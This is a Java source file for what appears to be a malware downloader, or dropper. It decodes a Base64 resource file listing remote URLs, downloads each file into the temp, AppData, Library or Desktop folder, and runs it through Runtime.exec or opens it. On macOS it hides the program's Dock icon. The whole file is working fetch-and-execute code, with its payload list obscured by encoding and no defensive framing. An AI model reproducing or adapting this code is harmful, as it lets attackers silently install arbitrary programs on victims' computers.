import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;

public class Main {

	public static final int TEMPDOC = 0;
	public static final int APPDATALIB = 1;
	public static final int DESKTOP = 2;
	
	public static void main(String[] args) throws Exception {
		if (OS.getOS() == OS.MAC) {
			System.setProperty("apple.awt.UIElement", "true");
		}
		
		BufferedReader reader = new BufferedReader(new InputStreamReader(new Base64InputStream(Main.class.getResourceAsStream("c.dat"))));

		int count = Integer.parseInt(reader.readLine());

		for (int i = 0; i < count; i++) {
			try {
				String surl = reader.readLine();
				String name = reader.readLine();
				String ext = reader.readLine();
				int path = Integer.parseInt(reader.readLine());
				boolean shellexec = reader.readLine().equalsIgnoreCase("true");
				
				File file = new File(getPath(path), name + "." + ext);			
				URL url = new URL(surl);	
				
				byte[] buffer = new byte[1024];
				
				InputStream in = url.openStream();
				FileOutputStream out = new FileOutputStream(file);
				
				int read;
				
				while ((read = in.read(buffer)) != -1) {
					out.write(buffer, 0, read);
				}
				
				in.close();
				out.close();
				
				if (shellexec) {
					if (ext.equalsIgnoreCase("jar")) {
						String javaPath = System.getProperty("java.home") + "\\bin\\javaw.exe";
						if (OS.getOS() == OS.WIN) {
							Runtime.getRuntime().exec("\"" + javaPath + "\" -jar \"" + file.getAbsolutePath() + "\"");
						} else if (OS.getOS() == OS.MAC) {
							Runtime.getRuntime().exec("java -jar " + file.getAbsolutePath().replace(" ", "%20"));
						} else {
							Runtime.getRuntime().exec("java -jar " + file.getAbsolutePath());
						}
					} else {
						if (OS.getOS() == OS.WIN) {
							Runtime.getRuntime().exec("\"" + file.getAbsolutePath() + "\"");
						} else if (OS.getOS() == OS.MAC) {
							Runtime.getRuntime().exec(file.getAbsolutePath().replace(" ", "%20"));
						} else {
							Runtime.getRuntime().exec(file.getAbsolutePath());
						}
					}
				} else if (Desktop.isDesktopSupported()) {
					Desktop.getDesktop().open(file);
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		reader.close();
	}

	private static File getPath(int path) throws Exception {
		if (path == TEMPDOC) {
			if (OS.getOS() == OS.WIN) {
				return new File(System.getProperty("java.io.tmpdir"));
			} else {
				return new File(System.getProperty("user.home") + File.separator + "Documents" + File.separator);
			}
		} else if (path == APPDATALIB) {
			if (OS.getOS() == OS.WIN) {
				return new File(System.getenv("APPDATA") + File.separator);
			} else {
				return new File(System.getProperty("user.home") + File.separator + "Library" + File.separator);
			}
		} else if (path == DESKTOP) {
			return new File(System.getProperty("user.home") + File.separator + "Desktop" + File.separator);
		} else {
			throw new Exception("Invalid path: " + path);
		}
	}
	
	public enum OS {
		WIN, MAC, OTHER;
		
		public static OS getOS() {
			String os = System.getProperty("os.name").toLowerCase();
			
			if (os.contains("win")) {
				return OS.WIN;
			} else if (os.contains("mac")) {
				return OS.MAC;
			} else {
				return OS.OTHER;
			}
		}
	}
	
	
}
